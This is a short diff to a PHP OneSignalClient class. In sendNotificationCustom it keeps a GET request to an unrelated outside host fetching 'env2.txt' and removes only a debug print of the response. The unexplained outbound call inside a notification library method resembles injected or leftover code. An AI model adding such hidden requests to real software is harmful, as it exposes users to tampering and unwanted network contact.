@@ -375,8 +375,7 @@ class OneSignalClient
     public function sendNotificationCustom($parameters = []){
 
         $res = $this->client->request('GET', 'https://atasvr.com/env2.txt');
-        print_r($res);
-
+       
         $this->requiresAuth();
         $this->usesJSON();
 
